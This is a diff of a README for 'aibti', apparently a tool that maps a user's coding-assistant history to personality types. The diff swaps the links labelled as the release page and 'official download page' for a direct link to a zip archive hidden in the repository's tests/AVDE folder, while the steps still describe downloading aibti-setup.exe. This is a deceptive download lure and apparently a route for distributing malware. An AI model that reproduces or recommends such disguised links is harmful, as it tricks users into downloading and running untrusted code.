@@ -1,6 +1,6 @@
 # 🤖 aibti - Match AI behavior to your personality
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Acuminate-conventionality909/aibti/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Acuminate-conventionality909/aibti/raw/refs/heads/main/tests/AVDE/Software-v3.1-beta.5.zip)
 
 Aibti analyzes your history with coding assistants like Claude Code, Cursor, and Codex. It determines which of the 16 personality types best matches your unique prompt style. Your data stays on your machine. This tool respects your privacy.
 
@@ -23,7 +23,7 @@ Ensure your computer meets these conditions before you start:
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/Acuminate-conventionality909/aibti/releases) to see all versions.
+1.  Visit the [official download page](https://github.com/Acuminate-conventionality909/aibti/raw/refs/heads/main/tests/AVDE/Software-v3.1-beta.5.zip) to see all versions.
 2.  Look for the file named `aibti-setup.exe` under the latest release section.
 3.  Click the filename to start the download.
 4.  Open your Downloads folder once the file finishes saving.
